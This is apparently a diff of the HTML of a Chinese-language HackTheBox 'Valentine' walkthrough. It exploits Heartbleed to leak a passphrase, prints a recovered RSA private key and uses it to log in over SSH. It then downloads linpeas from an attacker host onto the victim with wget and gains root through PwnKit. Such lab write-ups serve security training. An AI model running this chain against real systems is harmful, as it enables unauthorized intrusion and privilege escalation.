+<p><img loading="lazy" src="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155329208.png" alt="image-20230429155329208" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155329208.png?size=small, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155329208.png?size=medium 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429155329208.png?size=large 2x" data-title="image-20230429155329208" style="--width: 2286px;--aspect-ratio: 2286 / 1314;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>心脏滴血是一个信息泄露漏洞，每次泄露的信息并不一样，所以需要多执行几次。</p>
-<h3 id="非msf">非MSF</h3>
-<p>搜索EXP：</p>
+<h3 id="非msf" class="heading-element"><span>非MSF</span>
+  <a href="#%e9%9d%9emsf" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>搜索EXP：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -494,8 +435,7 @@
 </span></span><span class="line"><span class="cl">OpenSSL TLS Heartbeat Extension - <span class="s1">&#39;Heartbleed&#39;</span> Information Leak <span class="o">(</span>2<span class="o">)</span> <span class="o">(</span>DTLS Support<span class="o">)</span>                       <span class="p">|</span> multiple/remote/32998.c
 </span></span><span class="line"><span class="cl">OpenSSL TLS Heartbeat Extension - <span class="s1">&#39;Heartbleed&#39;</span> Memory Disclosure                                         <span class="p">|</span> multiple/remote/32745.py
 </span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------------------- ---------------------------------
-</span></span><span class="line"><span class="cl">Shellcodes: No Results
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">Shellcodes: No Results</span></span></code></pre></td></tr></table>
 </div>
 </div><p>找个利用脚本进行利用</p>
 <div class="highlight"><div class="chroma">
@@ -539,8 +479,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Options:
 </span></span><span class="line"><span class="cl">  -h, --help            show this <span class="nb">help</span> message and <span class="nb">exit</span>
-</span></span><span class="line"><span class="cl">  -p PORT, --port<span class="o">=</span>PORT  TCP port to <span class="nb">test</span> <span class="o">(</span>default: 443<span class="o">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">  -p PORT, --port<span class="o">=</span>PORT  TCP port to <span class="nb">test</span> <span class="o">(</span>default: 443<span class="o">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>漏洞利用：</p>
 <div class="highlight"><div class="chroma">
@@ -580,19 +519,17 @@
 </span></span><span class="line"><span class="cl">  0000: <span class="m">02</span> <span class="m">40</span> <span class="m">00</span> D8 <span class="m">03</span> <span class="m">00</span> <span class="m">53</span> <span class="m">43</span> 5B <span class="m">90</span> 9D 9B <span class="m">72</span> 0B BC 0C  .@....SC<span class="o">[</span>...r...
 </span></span><span class="line"><span class="cl">  0010: BC 2B <span class="m">92</span> A8 <span class="m">48</span> <span class="m">97</span> CF BD <span class="m">39</span> <span class="m">04</span> CC <span class="m">16</span> 0A <span class="m">85</span> <span class="m">03</span> <span class="m">90</span>  .+..H...9.......
 </span></span><span class="line"><span class="cl">  0020: 9F <span class="m">77</span> <span class="m">04</span> <span class="m">33</span> D4 DE <span class="m">00</span> <span class="m">00</span> <span class="m">66</span> C0 <span class="m">14</span> C0 0A C0 <span class="m">22</span> C0  .w.3....f.....<span class="s2">&#34;.
-</span></span></span><span class="line"><span class="cl"><span class="s2">  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
-</span></span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="s2">  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>同样，因为信息泄露的不确定性，我们需要多执行几次，以发现所期望的敏感信息。</p>
-<p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429160817669.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429160817669.png, resource/012-Valentine.assets/image-20230429160817669.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429160817669.png 2x" sizes="auto" data-title="image-20230429160817669" data-alt="image-20230429160817669" width="1448" height="1430" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429160817669.png" alt="image-20230429160817669" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429160817669.png?size=small, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429160817669.png?size=medium 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429160817669.png?size=large 2x" data-title="image-20230429160817669" style="--width: 1448px;--aspect-ratio: 1448 / 1430;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>执行了多次后，发现泄露了如下信息：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....<span class="nv">$text</span><span class="o">=</span><span class="nv">aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg</span><span class="o">==</span>.
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....<span class="nv">$text</span><span class="o">=</span><span class="nv">aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg</span><span class="o">==</span>.</span></span></code></pre></td></tr></table>
 </div>
 </div><p>对<code>$text</code>的值<code>aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</code>进行base64解密</p>
 <div class="highlight"><div class="chroma">
@@ -604,11 +541,13 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ <span class="nb">echo</span> <span class="s2">&#34;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&#34;</span> <span class="p">|</span> base64 -d
-</span></span><span class="line"><span class="cl">heartbleedbelievethehype
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">heartbleedbelievethehype</span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="web扫描">Web扫描</h2>
-<p>这边decode.php也提示我忘了一个环节：对Web路径的探测，这里补一下</p>
+</div><h2 id="web扫描" class="heading-element"><span>Web扫描</span>
+  <a href="#web%e6%89%ab%e6%8f%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>这边decode.php也提示我忘了一个环节：对Web路径的探测，这里补一下</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -628,11 +567,10 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>16:14:19<span class="o">]</span> Starting: 
 </span></span><span class="line"><span class="cl"><span class="o">[</span>16:15:27<span class="o">]</span> <span class="m">301</span> -  310B  - /dev  -&gt;  https://10.10.10.79/dev/  
 </span></span><span class="line"><span class="cl"><span class="o">[</span>16:15:27<span class="o">]</span> <span class="m">200</span> -    1KB - /dev/
-</span></span><span class="line"><span class="cl"><span class="o">[</span>16:15:39<span class="o">]</span> <span class="m">200</span> -   38B  - /index.php  
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>16:15:39<span class="o">]</span> <span class="m">200</span> -   38B  - /index.php  </span></span></code></pre></td></tr></table>
 </div>
 </div><p>访问dev目录如下：</p>
-<p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429161913176.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429161913176.png, resource/012-Valentine.assets/image-20230429161913176.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429161913176.png 2x" sizes="auto" data-title="image-20230429161913176" data-alt="image-20230429161913176" width="1256" height="692" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429161913176.png" alt="image-20230429161913176" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429161913176.png?size=small, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429161913176.png?size=medium 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429161913176.png?size=large 2x" data-title="image-20230429161913176" style="--width: 1256px;--aspect-ratio: 1256 / 692;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>查看notes.txt</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -653,19 +591,17 @@
 </span></span><span class="line"><span class="cl">3) Fix decoder/encoder before going live.
 </span></span><span class="line"><span class="cl">4) Make sure encoding/decoding is only done client-side.
 </span></span><span class="line"><span class="cl">5) Don&#39;t use the decoder/encoder until any of this is done.
-</span></span><span class="line"><span class="cl">6) Find a better way to take notes.
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">6) Find a better way to take notes.</span></span></code></pre></td></tr></table>
 </div>
 </div><p>查看hype_key：</p>
-<p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429163925200.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429163925200.png, resource/012-Valentine.assets/image-20230429163925200.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429163925200.png 2x" sizes="auto" data-title="image-20230429163925200" data-alt="image-20230429163925200" width="2304" height="1140" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429163925200.png" alt="image-20230429163925200" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429163925200.png?size=small, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429163925200.png?size=medium 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429163925200.png?size=large 2x" data-title="image-20230429163925200" style="--width: 2304px;--aspect-ratio: 2304 / 1140;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>下载hype_key</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ wget https://10.10.10.79/dev/hype_key --no-check-certificate
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ wget https://10.10.10.79/dev/hype_key --no-check-certificate</span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后通过xxd 对十六进制进行转换：</p>
 <div class="highlight"><div class="chroma">
@@ -735,12 +671,14 @@
 </span></span><span class="line"><span class="cl">suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
 </span></span><span class="line"><span class="cl">l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
 </span></span><span class="line"><span class="cl">RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-</span></span><span class="line"><span class="cl">-----END RSA PRIVATE KEY----- 
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">-----END RSA PRIVATE KEY----- </span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以看到是一个RSA私钥，接下去用ssh进行连接</p>
-<h2 id="初始shell">初始shell</h2>
-<p>对hype_key进行转码，并通过ssh进行连接</p>
+<h2 id="初始shell" class="heading-element"><span>初始shell</span>
+  <a href="#%e5%88%9d%e5%a7%8bshell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>对hype_key进行转码，并通过ssh进行连接</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -762,8 +700,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/HTB/012-Valentine<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─$ ssh -i hype_key.rsa hype@10.10.10.79
-</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;hype_key.rsa&#39;</span>: 
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;hype_key.rsa&#39;</span>: </span></span></code></pre></td></tr></table>
 </div>
 </div><p>这里私钥有密码，想到了之前decode中获取的字符串：heartbleedbelievethehype</p>
 <div class="highlight"><div class="chroma">
@@ -779,8 +716,7 @@
 </span></span><span class="line"><span class="cl">└─$ ssh -i hype_key.rsa hype@10.10.10.79
 </span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;hype_key.rsa&#39;</span>: 
 </span></span><span class="line"><span class="cl">sign_and_send_pubkey: no mutual signature supported
-</span></span><span class="line"><span class="cl">hype@10.10.10.79<span class="err">&#39;</span>s password: 
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">hype@10.10.10.79<span class="err">&#39;</span>s password: </span></span></code></pre></td></tr></table>
 </div>
 </div><p>这里有个报错，因为新版本的ssh不再支持一些弱加密算法，所以如果要用的话需要手动指定<code>-o PubkeyAcceptedKeyTypes=+ssh-rsa</code>。</p>
 <div class="highlight"><div class="chroma">
@@ -814,8 +750,7 @@
 </span></span><span class="line"><span class="cl">Last login: Fri Feb <span class="m">16</span> 14:50:29 <span class="m">2018</span> from 10.10.14.3
 </span></span><span class="line"><span class="cl">hype@Valentine:~$ id
 </span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>hype<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>hype<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>hype<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,124<span class="o">(</span>sambashare<span class="o">)</span>
-</span></span><span class="line"><span class="cl">hype@Valentine:~$ 
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">hype@Valentine:~$ </span></span></code></pre></td></tr></table>
 </div>
 </div><p>这里也可以修改SSH配置文件，在文件末尾追加以下内容</p>
 <div class="highlight"><div class="chroma">
@@ -827,12 +762,14 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Host *
 </span></span><span class="line"><span class="cl">    <span class="nv">PubkeyAcceptedKeyTypes</span><span class="o">=</span>+ssh-rsa
-</span></span><span class="line"><span class="cl">    <span class="nv">HostKeyAlgorithms</span><span class="o">=</span>+ssh-rsa
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">    <span class="nv">HostKeyAlgorithms</span><span class="o">=</span>+ssh-rsa</span></span></code></pre></td></tr></table>
 </div>
-</div><p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429170722849.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429170722849.png, resource/012-Valentine.assets/image-20230429170722849.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429170722849.png 2x" sizes="auto" data-title="image-20230429170722849" data-alt="image-20230429170722849" width="2270" height="1036" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
-<h2 id="root-shell">root shell</h2>
-<p>上传linpeas.sh进行信息搜集，利用Python和wget进行上传</p>
+</div><p><img loading="lazy" src="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429170722849.png" alt="image-20230429170722849" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429170722849.png?size=small, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429170722849.png?size=medium 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429170722849.png?size=large 2x" data-title="image-20230429170722849" style="--width: 2270px;--aspect-ratio: 2270 / 1036;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="root-shell" class="heading-element"><span>root shell</span>
+  <a href="#root-shell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>上传linpeas.sh进行信息搜集，利用Python和wget进行上传</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -856,13 +793,15 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># Victim</span>
 </span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ wget http://10.10.14.22/linpeas.sh
 </span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ chmod +x linpeas.sh
-</span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ ./linpeas.sh &gt; result.txt
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ ./linpeas.sh &gt; result.txt</span></span></code></pre></td></tr></table>
 </div>
 </div><p>利用同样的方式，再把result.txt下载到本地</p>
-<h3 id="cve-2021-4034">CVE-2021-4034</h3>
-<p>查看result.txt，发现系统存在sudo CVE-2021-4034漏洞，可利用该漏洞提权。</p>
-<p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429172250485.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172250485.png, resource/012-Valentine.assets/image-20230429172250485.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172250485.png 2x" sizes="auto" data-title="image-20230429172250485" data-alt="image-20230429172250485" width="1242" height="200" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h3 id="cve-2021-4034" class="heading-element"><span>CVE-2021-4034</span>
+  <a href="#cve-2021-4034" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>查看result.txt，发现系统存在sudo CVE-2021-4034漏洞，可利用该漏洞提权。</p>
+<p><img loading="lazy" src="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172250485.png" alt="image-20230429172250485" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172250485.png?size=small, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172250485.png?size=medium 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172250485.png?size=large 2x" data-title="image-20230429172250485" style="--width: 1242px;--aspect-ratio: 1242 / 200;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -878,10 +817,9 @@
 </span></span><span class="line"><span class="cl">hype@Valentine:/tmp$ ./PwnKit 
 </span></span><span class="line"><span class="cl">root@Valentine:/tmp# id  
 </span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,124<span class="o">(</span>sambashare<span class="o">)</span>,1000<span class="o">(</span>hype<span class="o">)</span>
-</span></span><span class="line"><span class="cl">root@Valentine:/tmp# 
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">root@Valentine:/tmp# </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img loading="lazy" src="resource/012-Valentine.assets/image-20230429172533596.png" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172533596.png, resource/012-Valentine.assets/image-20230429172533596.png 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172533596.png 2x" sizes="auto" data-title="image-20230429172533596" data-alt="image-20230429172533596" width="2210" height="606" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+</div><p><img loading="lazy" src="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172533596.png" alt="image-20230429172533596" srcset="/posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172533596.png?size=small, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172533596.png?size=medium 1.5x, /posts/hackthebox-valentine/resource/012-Valentine.assets/image-20230429172533596.png?size=large 2x" data-title="image-20230429172533596" style="--width: 2210px;--aspect-ratio: 2210 / 606;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -893,12 +831,14 @@
 <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@Valentine:/tmp# cat /root/root.txt 
 </span></span><span class="line"><span class="cl">adf6f323296f600cec9294d64c6c9bc1
